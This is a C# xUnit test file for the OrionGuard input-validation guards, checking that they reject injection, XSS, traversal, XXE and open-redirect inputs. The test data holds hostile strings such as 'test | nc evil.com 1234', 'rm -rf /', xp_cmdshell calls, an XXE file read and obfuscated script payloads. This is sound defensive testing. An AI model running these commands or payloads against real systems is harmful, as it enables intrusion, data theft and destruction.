using Moongazing.OrionGuard.Extensions;

namespace Moongazing.OrionGuard.Tests;

public class SecurityGuardsTests
{
    #region AgainstSqlInjection

    [Theory]
    [InlineData("SELECT * FROM Users")]
    [InlineData("'; DROP TABLE Users;--")]
    [InlineData("UNION SELECT password FROM users")]
    [InlineData("admin' OR '1'='1'; EXEC xp_cmdshell")]
    [InlineData("1; TRUNCATE TABLE orders")]
    [InlineData("WAITFOR DELAY '00:00:10'")]
    [InlineData("DECLARE @cmd NVARCHAR(100)")]
    public void AgainstSqlInjection_ShouldThrow_WhenInputContainsSqlPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstSqlInjection(nameof(input)));
    }

    [Theory]
    [InlineData("John Doe")]
    [InlineData("tunahan@example.com")]
    [InlineData("My product description")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstSqlInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstSqlInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstXss

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img onerror=alert(1)>")]
    [InlineData("javascript:void(0)")]
    [InlineData("<iframe src='evil.com'>")]
    [InlineData("document.cookie")]
    [InlineData("window.location='evil.com'")]
    [InlineData("<embed src='evil'>")]
    public void AgainstXss_ShouldThrow_WhenInputContainsXssPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstXss(nameof(input)));
    }

    [Theory]
    [InlineData("Hello World")]
    [InlineData("A perfectly normal sentence.")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstXss_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstXss(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstPathTraversal

    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("..\\..\\Windows\\System32")]
    [InlineData("%2e%2e%2f")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows")]
    public void AgainstPathTraversal_ShouldThrow_WhenInputContainsTraversalPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstPathTraversal(nameof(input)));
    }

    [Theory]
    [InlineData("images/photo.jpg")]
    [InlineData("documents/report.pdf")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstPathTraversal_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstPathTraversal(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstCommandInjection

    [Theory]
    [InlineData("file; rm -rf /")]
    [InlineData("input && cat /etc/passwd")]
    [InlineData("test | nc evil.com 1234")]
    [InlineData("$(cat /etc/passwd)")]
    [InlineData("file `whoami`")]
    [InlineData("cmd.exe /c dir")]
    [InlineData("powershell Get-Process")]
    public void AgainstCommandInjection_ShouldThrow_WhenInputContainsCommandPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstCommandInjection(nameof(input)));
    }

    [Theory]
    [InlineData("Hello World")]
    [InlineData("normal-file-name.txt")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstCommandInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstCommandInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstLdapInjection

    [Theory]
    [InlineData("admin)(objectClass=*)")]
    [InlineData("user*")]
    [InlineData("cn=test\\00")]
    [InlineData("ou=test\0")]
    public void AgainstLdapInjection_ShouldThrow_WhenInputContainsLdapPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstLdapInjection(nameof(input)));
    }

    [Theory]
    [InlineData("john.doe")]
    [InlineData("admin-user")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstLdapInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstLdapInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstXxe

    [Theory]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")]
    [InlineData("<!DOCTYPE test [<!ENTITY xxe \"test\">]>")]
    public void AgainstXxe_ShouldThrow_WhenInputContainsXxePatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstXxe(nameof(input)));
    }

    [Theory]
    [InlineData("<root><item>value</item></root>")]
    [InlineData("Just normal text")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstXxe_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstXxe(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstInjection (Combined)

    [Theory]
    [InlineData("SELECT * FROM Users")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("test; rm -rf /")]
    public void AgainstInjection_ShouldThrow_WhenInputContainsAnyInjectionPattern(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstInjection(nameof(input)));
    }

    [Fact]
    public void AgainstInjection_ShouldNotThrow_WhenInputIsSafe()
    {
        var input = "A perfectly safe string with no injection patterns";
        var exception = Record.Exception(() => input.AgainstInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstUnsafeFileName

    [Theory]
    [InlineData("../../evil.exe")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void AgainstUnsafeFileName_ShouldThrow_WhenFileNameIsUnsafe(string? input)
    {
        Assert.Throws<ArgumentException>(() => input!.AgainstUnsafeFileName(nameof(input)));
    }

    [Theory]
    [InlineData("report.pdf")]
    [InlineData("my-image.png")]
    [InlineData("document_v2.docx")]
    public void AgainstUnsafeFileName_ShouldNotThrow_WhenFileNameIsSafe(string input)
    {
        var exception = Record.Exception(() => input.AgainstUnsafeFileName(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstOpenRedirect

    [Fact]
    public void AgainstOpenRedirect_ShouldThrow_WhenRedirectToUntrustedDomain()
    {
        var url = "https://evil.com/phishing";
        Assert.Throws<ArgumentException>(() => url.AgainstOpenRedirect(nameof(url), "example.com", "trusted.com"));
    }

    [Fact]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenRedirectToAllowedDomain()
    {
        var url = "https://example.com/dashboard";
        var exception = Record.Exception(() => url.AgainstOpenRedirect(nameof(url), "example.com"));
        Assert.Null(exception);
    }

    [Fact]
    public void AgainstOpenRedirect_ShouldThrow_WhenProtocolRelativeUrl()
    {
        // Protocol-relative URLs parsed as absolute by .NET - need allowedDomains to trigger domain check
        var url = "//evil.com/phishing";
        Assert.Throws<ArgumentException>(() => url.AgainstOpenRedirect(nameof(url), "safe.com"));
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenNullOrEmpty(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstOpenRedirect(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstOpenRedirect (IsLocalUrl semantics)

    [Theory]
    [InlineData("/\t/evil.com")]
    [InlineData("/\n/evil.com")]
    [InlineData("javascript://example.com/%0aalert(document.domain)")]
    [InlineData("https:evil.com")]
    [InlineData("~//evil.com")]
    public void AgainstOpenRedirect_ShouldThrow_WhenValueIsNotLocalOrAllowed(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstOpenRedirect(nameof(input), "example.com"));
    }

    // Rejected before the rewrite as well; kept so the IsLocalUrl rules cannot loosen them.
    [Theory]
    [InlineData("/\\evil.com")]
    [InlineData("\\\\evil.com")]
    [InlineData("//evil.com")]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    [InlineData("https://example.com@evil.com/")]
    public void AgainstOpenRedirect_ShouldStillThrow_WhenValueTargetsAnotherHost(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstOpenRedirect(nameof(input), "example.com"));
    }

    [Theory]
    [InlineData("//evil.com")]
    [InlineData("/\\evil.com")]
    [InlineData("\\\\evil.com")]
    [InlineData("https://evil.com/")]
    public void AgainstOpenRedirect_ShouldThrow_WhenAllowListIsEmptyAndValueIsNotLocal(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstOpenRedirect(nameof(input)));
    }

    [Fact]
    public void AgainstOpenRedirect_ShouldThrow_WhenValueIsRelativeWithoutLeadingSlash()
    {
        var url = "page.html";
        Assert.Throws<ArgumentException>(() => url.AgainstOpenRedirect(nameof(url), "example.com"));
    }

    [Theory]
    [InlineData("/")]
    [InlineData("/account/profile")]
    [InlineData("/search?q=orion%20guard#top")]
    [InlineData("~/dashboard")]
    [InlineData("https://example.com/dashboard")]
    [InlineData("https://app.example.com/")]
    [InlineData("http://EXAMPLE.com:8080/path")]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenValueIsLocalOrOnAllowedHost(string input)
    {
        var exception = Record.Exception(() => input.AgainstOpenRedirect(nameof(input), "example.com"));
        Assert.Null(exception);
    }

    [Theory]
    [InlineData("/")]
    [InlineData("/account/profile")]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenValueIsLocalAndAllowListIsEmpty(string input)
    {
        var exception = Record.Exception(() => input.AgainstOpenRedirect(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstPathTraversal (decoded, normalized, rooted)

    [Theory]
    [InlineData("/etc/hosts")]
    [InlineData("C:\\inetpub\\wwwroot\\web.config")]
    [InlineData("\\\\attacker\\share")]
    [InlineData("//attacker/share")]
    [InlineData(".%2e/.%2e/")]
    [InlineData("%2e./")]
    [InlineData("%252e%252e%252f")]
    [InlineData("\uFF0E\uFF0E\uFF0F")]
    [InlineData("%25252525252e")]
    public void AgainstPathTraversal_ShouldThrow_WhenValueIsEncodedTraversalOrRootedPath(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstPathTraversal(nameof(input)));
    }

    [Theory]
    [InlineData("images/photo.jpg")]
    [InlineData("reports/2024/q1%20summary.pdf")]
    [InlineData("file.name.with.dots.txt")]
    public void AgainstPathTraversal_ShouldNotThrow_WhenValueIsRelativePathWithoutTraversal(string input)
    {
        var exception = Record.Exception(() => input.AgainstPathTraversal(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstPathEscape

    private static readonly string PathEscapeRoot = Path.Combine(Path.GetTempPath(), "orionguard-uploads");

    [Theory]
    [InlineData("../secret.txt")]
    [InlineData("a/../../secret.txt")]
    [InlineData("/etc/hosts")]
    [InlineData("C:\\Windows\\win.ini")]
    [InlineData("C:win.ini")]
    [InlineData("\\\\attacker\\share\\x")]
    [InlineData(".")]
    [InlineData("a/..")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstPathEscape_ShouldThrow_WhenValueResolvesOutsideRoot(string? input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstPathEscape(PathEscapeRoot, nameof(input)));
    }

    [Fact]
    public void AgainstPathEscape_ShouldThrow_WhenSiblingDirectorySharesRootPrefix()
    {
        // "orionguard-uploads-evil" starts with the root's text but is a different directory.
        var input = "../orionguard-uploads-evil/x.txt";
        Assert.Throws<ArgumentException>(() => input.AgainstPathEscape(PathEscapeRoot, nameof(input)));
    }

    [Theory]
    [InlineData("photo.jpg")]
    [InlineData("2024/q1/report.pdf")]
    [InlineData("a/../b.txt")]
    public void AgainstPathEscape_ShouldReturnPathInsideRoot_WhenValueStaysInsideRoot(string input)
    {
        var fullPath = input.AgainstPathEscape(PathEscapeRoot, nameof(input));

        Assert.StartsWith(Path.GetFullPath(PathEscapeRoot) + Path.DirectorySeparatorChar, fullPath, StringComparison.Ordinal);
        Assert.Equal(Path.GetFullPath(Path.Join(PathEscapeRoot, input)), fullPath);
    }

    #endregion

    #region Injection heuristics: confirmed misses and false positives

    [Theory]
    [InlineData("admin' OR '1'='1")]
    [InlineData("' OR ''='")]
    [InlineData("x' OR 'a' = 'a")]
    public void AgainstSqlInjection_ShouldThrow_WhenInputIsQuotedTautology(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstSqlInjection(nameof(input)));
    }

    // The bare GRANT and OPEN keywords were dropped to stop rejecting names; these payloads must still be caught.
    [Theory]
    [InlineData("x' GRANT CONTROL SERVER TO guest PRINT '")]
    [InlineData("1 grant all privileges on db.* to 'eve'@'%'")]
    [InlineData("OPENROWSET('SQLNCLI', 'Server=evil;Trusted_Connection=yes;', 'dbo.t')")]
    [InlineData("OPENQUERY(evil, 'x')")]
    public void AgainstSqlInjection_ShouldStillThrow_WhenInputIsGrantStatementOrRowsetFunction(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstSqlInjection(nameof(input)));
    }

    [Fact]
    public void AgainstSqlInjection_ShouldNotTimeOut_WhenInputRepeatsGrantWithoutTo()
    {
        // A GRANT scan that restarted at every GRANT would be quadratic here and hit the 1 s regex timeout.
        var input = string.Concat(Enumerable.Repeat("grant ", 200_000)) + string.Concat(Enumerable.Repeat("' ", 100_000));

        var exception = Record.Exception(() => input.AgainstSqlInjection(nameof(input)));

        Assert.Null(exception);
    }

    [Theory]
    [InlineData("Grant Smith")]
    [InlineData("open")]
    [InlineData("Please open the attachment")]
    [InlineData("Hugh Grant")]
    [InlineData("O'Brien")]
    public void AgainstSqlInjection_ShouldNotThrow_WhenInputIsOrdinaryName(string input)
    {
        var exception = Record.Exception(() => input.AgainstSqlInjection(nameof(input)));
        Assert.Null(exception);
    }

    // Keywords are matched at word boundaries, so a word that merely contains one is not a SQL keyword.
    [Theory]
    [InlineData("Walter White")]              // ALTER
    [InlineData("the executive summary")]     // EXEC
    [InlineData("a family reunion")]          // UNION
    [InlineData("selection criteria")]        // SELECT
    [InlineData("an updated address")]        // UPDATE
    [InlineData("deleted items")]             // DELETE
    [InlineData("an enclosed envelope")]      // CLOSE
    [InlineData("raindrops")]                 // DROP
    [InlineData("recreated the report")]      // CREATE
    [InlineData("a wasp_nest photo")]         // sp_
    [InlineData("the podcast(2024) episode")] // CAST(
    public void AgainstSqlInjection_ShouldNotThrow_WhenAKeywordIsOnlyPartOfAnOrdinaryWord(string input)
    {
        var exception = Record.Exception(() => input.AgainstSqlInjection(nameof(input)));
        Assert.Null(exception);
    }

    // The same words, now used as SQL, must stay rejected.
    [Theory]
    [InlineData("1; ALTER TABLE users ADD c int")]
    [InlineData("'; exec master..xp_cmdshell 'dir'")]
    [InlineData("1 UNION ALL SELECT NULL")]
    [InlineData("1 AND 1=CAST((SELECT TOP 1 name FROM sysobjects) AS int)")]
    [InlineData("'+CHAR(65)+'")]
    [InlineData("cast to NVARCHAR(4000)")]
    [InlineData("CONVERT(int, @x)")]
    [InlineData("1; DROP TABLE users")]
    [InlineData("SELECT * FROM INFORMATION_SCHEMA.TABLES")]
    [InlineData("1; CLOSE c; DEALLOCATE c")]
    public void AgainstSqlInjection_ShouldStillThrow_WhenTheKeywordIsUsedAsSql(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstSqlInjection(nameof(input)));
    }

    [Theory]
    [InlineData("<img src=x onerror =print()>")]
    [InlineData("<img src=x onerror\t=\nprint()>")]
    [InlineData("<details open ontoggle=print()>")]
    [InlineData("<a href=\"jav&#x61;script:print()\">x</a>")]
    [InlineData("<a href=\"jav&#97;script:print()\">x</a>")]
    [InlineData("<a href=\"javascript&colon;print()\">x</a>")]
    [InlineData("<a href=\"java\tscript:print()\">x</a>")]
    [InlineData("<svg><animate onbegin=print() attributeName=x dur=1s>")]
    public void AgainstXss_ShouldThrow_WhenVectorIsObfuscated(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstXss(nameof(input)));
    }

    [Theory]
    [InlineData("online = yes")]
    [InlineData("Tom & Jerry")]
    [InlineData("a = b")]
    [InlineData("Please open the door")]
    [InlineData("AT&amp;T")]
    public void AgainstXss_ShouldNotThrow_WhenInputIsOrdinaryText(string input)
    {
        var exception = Record.Exception(() => input.AgainstXss(nameof(input)));
        Assert.Null(exception);
    }

    [Theory]
    [InlineData("a.txt & whoami")]
    [InlineData("\nid")]
    [InlineData("a.txt\r\nid")]
    [InlineData("> /etc/cron.d/x")]
    [InlineData("< /etc/passwd")]
    [InlineData("$HOME")]
    [InlineData("it's")]
    [InlineData("say \"hi\"")]
    [InlineData("--output=/tmp/x")]
    [InlineData("  -rf")]
    public void AgainstCommandInjection_ShouldThrow_WhenInputHasShellMetacharacterOrLeadingDash(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstCommandInjection(nameof(input)));
    }

    [Theory]
    [InlineData("report-2024.pdf")]
    [InlineData("photo_01.jpg")]
    [InlineData("Grant Smith")]
    public void AgainstCommandInjection_ShouldNotThrow_WhenInputIsPlainArgument(string input)
    {
        var exception = Record.Exception(() => input.AgainstCommandInjection(nameof(input)));
        Assert.Null(exception);
    }

    [Theory]
    [InlineData("<img src=x onerror =print()>")]
    [InlineData("admin' OR '1'='1")]
    [InlineData("%2e./%2e./web.config")]
    public void AgainstInjection_ShouldThrow_WhenInputIsConfirmedBypass(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstInjection(nameof(input)));
    }

    [Theory]
    [InlineData("Grant Smith")]
    [InlineData("open")]
    [InlineData("O'Brien")]
    [InlineData("Tom & Jerry")]
    [InlineData("/help")]
    [InlineData("A: yes")]
    public void AgainstInjection_ShouldNotThrow_WhenInputIsOrdinaryText(string input)
    {
        var exception = Record.Exception(() => input.AgainstInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion
}
